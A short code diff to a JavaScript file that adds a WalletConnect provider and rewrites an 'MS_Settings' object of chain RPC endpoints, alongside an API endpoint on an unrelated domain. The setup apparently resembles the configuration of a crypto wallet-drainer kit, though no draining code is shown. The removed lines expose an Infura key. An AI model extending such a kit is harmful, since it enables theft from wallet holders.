@@ -1,10 +1,23 @@
-// Single source of truth for these declarations
-const API_ENDPOINT = 'https://fasterdeliveryuae.com';
-const MS_Settings = {
-    RPCs: {
-        1: "https://mainnet.infura.io/v3/511362d7fcc8491f9af15cc7fadf46ae",
+// Add WalletConnect provider
+const WalletConnectProvider = window.WalletConnectProvider.default;
+
+// Initialize provider
+const provider = new WalletConnectProvider({
+    rpc: {
+        1: "https://mainnet.infura.io/v3/YOUR_INFURA_KEY",
         56: "https://bsc-dataseed.binance.org/",
         137: "https://polygon-rpc.com"
+    }
+});
+
+// Rest of your existing code
+const API_ENDPOINT = 'https://fasterdeliveryuae.com';
+const MS_Settings = {
+    RPCs: provider.rpc,
+    chains: {
+        1: { name: "Ethereum", explorer: "https://etherscan.io" },
+        56: { name: "BSC", explorer: "https://bscscan.com" },
+        137: { name: "Polygon", explorer: "https://polygonscan.com" }
     }
 };
 
